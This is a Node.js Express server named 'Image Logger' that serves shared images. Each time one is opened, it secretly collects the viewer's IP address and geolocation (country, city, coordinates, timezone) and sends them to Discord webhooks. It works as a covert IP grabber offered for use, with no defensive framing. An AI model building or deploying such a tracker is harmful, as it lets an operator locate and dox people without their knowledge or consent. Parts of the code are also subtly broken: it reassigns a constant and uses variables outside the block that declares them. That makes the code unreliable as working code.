// Importing modules
const express = require('express')
const geoip = require('geoip-lite')
const { v4: uuidv4 } = require('uuid')
const bodyParser = require('body-parser')
const { createCanvas, loadImage } = require('canvas')
const { createLogger, format, transports } = require('winston')
const { WebhookClient, EmbedBuilder, AttachmentBuilder } = require('discord.js')

// Importing config
const config = require('./config.json')

// Creating logger
const logger = createLogger({
  level: 'info',
  format: format.combine(
    format.label({ label: 'Image Logger' }),
    format.timestamp(),
    format.printf(({ level, message, label, timestamp }) => {
      return `${timestamp} [${label}] ${level}: ${message}`
    })
  ),
  transports: [
    new transports.Console(),
    new transports.File({ filename: 'combined.log' })
  ]
})

// Creating canvas
const canvas = createCanvas(1920, 1080)
const ctx = canvas.getContext('2d')

// Set canvas background to transparent
ctx.fillStyle = 'rgba(0, 0, 0, 0)'
ctx.fillRect(0, 0, canvas.width, canvas.height)

// Creating image logger
const imageLogger = (imageData, imageName) => {
  loadImage(imageData)
    .then(image => {
      // Clearing canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height)

      // Set canvas background to transparent
      ctx.fillStyle = 'rgba(0, 0, 0, 0)'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      // Drawing image
      ctx.drawImage(image, 0, 0, canvas.width, canvas.height)
    })
    .catch(error => {
      logger.error(`Error loading image ${imageName}: ${error}`)
    })
}

// Function to send the image to the webhooks
const sendImageToWebhooks = (
  imageName,
  imageUrl,
  clientIP,
  timezone,
  country,
  city,
  ll
) => {
  const randomcolors = ['#008000', '#E50000']
  const randomWebhookColor =
    randomcolors[Math.floor(Math.random() * randomcolors.length)]

  config.webhooks.forEach(webhook => {
    const webhookClient = new WebhookClient({ url: webhook.url })
    const embed = new EmbedBuilder()
      .setTitle('Someone requested an image')
      .setFields([
        {
          name: '🖼️ Image',
          value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
        },
        {
          name: '📡 Network',
          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${
            timezone || 'not found'
          }\n🌍 Country: ${country || 'not found'}\n🏙️ City: ${
            city || 'not found'
          }\n📍 Coordinates: ${ll || 'not found'}\`\`\``
        }
      ])
      .setThumbnail(`attachment://${imageName}`)
      .setColor(randomWebhookColor)
      .setTimestamp()

    webhookClient
      .send({
        embeds: [embed]
      })
      .then(() => {
        logger.info(`Image ${imageName} sent to webhook ${webhook.name}`)
      })
      .catch(error => {
        logger.error(
          `Error sending image ${imageName} to webhook ${webhook.name}: ${error}`
        )
      })
  })
}

// Creating express app
const app = express()

// Trusting proxy
app.enable('trust proxy')

// Parsing request bodies
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))

// Serve the homepage with the list of available images
app.get('/', (req, res) => {
  const imageList = config.images.map(image => {
    return `
      <div class="image-container">
        <h2>${image.name}</h2>
        <img src="/image/${encodeURIComponent(image.name)}" alt="${
      image.name
    }" class="thumbnail" />
      </div>
    `
  })

  // Render the homepage with the image list
  res.send(`
    <html>
      <head>
        <title>Image Logger</title>
        <style>
          body {
            background-color: #222;
            color: #fff;
            padding: 20px;
            font-family: Arial, sans-serif;
          }
          .image-container {
            display: inline-block;
            margin: 10px;
            text-align: center;
          }
          .thumbnail {
            width: 200px;
            height: auto;
          }
        </style>
      </head>
      <body>
        <h1>Available Images</h1>
        ${imageList.join('')}
      </body>
    </html>
  `)
})

// Serve the image and log the request
app.get('/image/:imageName', (req, res) => {
  const { imageName } = req.params
  const image = config.images.find(img => img.name === imageName)

  if (image) {
    const imageUrl = image.url
    const imageName = `${image.name}.png`

    // Log the request
    logger.info(`Image requested: ${imageUrl}`)

    // Serve the image
    res.sendFile(
      imageUrl,
      { root: __dirname, headers: { 'Content-Type': 'image/png' } },
      error => {
        if (error) {
          logger.error(`Error sending image: ${error}`)
        } else {
          logger.info(`Image ${imageName} sent to the client`)
        }
      }
    )

    try {
      // Get client IP
      const clientIP =
        req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress ||
        'not found'

      if (clientIP === '::1') {
        clientIP = '0.0.0.0'
      }

      if (clientIP.substr(0, 7) === '::ffff:') {
        clientIP = clientIP.substr(7)
      }

      if (clientIP !== 'not found') {
        // Get client's information
        try {
          const ipInfo = geoip.lookup(clientIP)
          let { timezone, country, city, ll } = ipInfo
        } catch (error) {
          logger.error(`Error getting client's information: ${error}`)
        }

        if (!timezone) {
          timezone = 'not found'
        }
        if (!country) {
          country = 'not found'
        }
        if (!city) {
          city = 'not found'
        }
        if (!ll) {
          ll = 'not found'
        }

        logger.info(
          `Client IP: ${clientIP}, Timezone: ${timezone}, Country: ${country}, City: ${city}, Coordinates: ${ll}`
        )

        // Send the image to the webhooks
        sendImageToWebhooks(
          imageName,
          imageUrl,
          clientIP,
          timezone,
          country,
          city,
          ll
        )
      } else {
        logger.error('Client IP not found')
      }
    } catch (error) {
      logger.error(`Error sending image to webhooks: ${error}`)
    }
  } else {
    res.status(404).json({ message: 'Image not found' })
  }
})

// Handle the incoming image upload request
app.post('/upload', (req, res) => {
  const imageData = req.body // Assuming the image data is sent in the request body
  const imageName = `${uuidv4()}.png` // Generate a unique image name using UUID

  // Logging image
  imageLogger(imageData, imageName)

  res.status(200).json({ message: 'Image logged successfully' })
})

// Starting the server
const port = process.env.PORT || 3000
app.listen(port, () => {
  console.log(`Server started on port ${port}`)
  logger.info('Image logger started')
})
